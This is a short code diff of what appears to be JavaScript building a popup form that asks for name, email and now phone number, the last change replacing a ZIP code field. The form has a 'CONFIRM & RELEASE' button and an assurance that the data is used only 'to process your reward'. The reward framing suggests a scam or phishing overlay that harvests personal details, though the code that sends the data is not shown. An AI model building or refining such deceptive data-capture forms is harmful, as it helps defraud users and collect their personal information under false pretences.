@@ -95,8 +95,8 @@
       '<input id="__cfName" type="text" autocomplete="name" style="width:100%;box-sizing:border-box;padding:12px 14px;border:1px solid #e5e7eb;border-radius:10px;font-size:15px;background:#fafafa;color:#111;margin-bottom:14px;outline:none;" />' +
       '<label style="display:block;font-size:11px;font-weight:800;letter-spacing:1px;color:#6b7280;margin-bottom:6px;">EMAIL</label>' +
       '<input id="__cfEmail" type="email" inputmode="email" autocomplete="email" style="width:100%;box-sizing:border-box;padding:12px 14px;border:1px solid #e5e7eb;border-radius:10px;font-size:15px;background:#fafafa;color:#111;margin-bottom:14px;outline:none;" />' +
-      '<label style="display:block;font-size:11px;font-weight:800;letter-spacing:1px;color:#6b7280;margin-bottom:6px;">ZIP CODE</label>' +
-      '<input id="__cfZip" type="text" inputmode="text" autocomplete="postal-code" placeholder="ZIP / Postal code" style="width:100%;box-sizing:border-box;padding:12px 14px;border:1px solid #e5e7eb;border-radius:10px;font-size:15px;background:#fafafa;color:#111;margin-bottom:16px;outline:none;letter-spacing:2px;" />' +
+      '<label style="display:block;font-size:11px;font-weight:800;letter-spacing:1px;color:#6b7280;margin-bottom:6px;">PHONE</label>' +
+      '<input id="__cfPhone" type="tel" inputmode="tel" autocomplete="tel" placeholder="(555) 555-5555" style="width:100%;box-sizing:border-box;padding:12px 14px;border:1px solid #e5e7eb;border-radius:10px;font-size:15px;background:#fafafa;color:#111;margin-bottom:16px;outline:none;" />' +
       '<button id="__cfSubmit" type="button" style="width:100%;padding:14px;border:0;border-radius:10px;background:#FE2C55;color:#fff;font-weight:800;font-size:15px;letter-spacing:1px;cursor:pointer;">CONFIRM &amp; RELEASE</button>' +
       '<p style="margin:10px 0 0;font-size:11px;color:#9ca3af;text-align:center;line-height:1.4;">Your information is secure and will only be used to process your reward.</p>' +
       "</div>" +
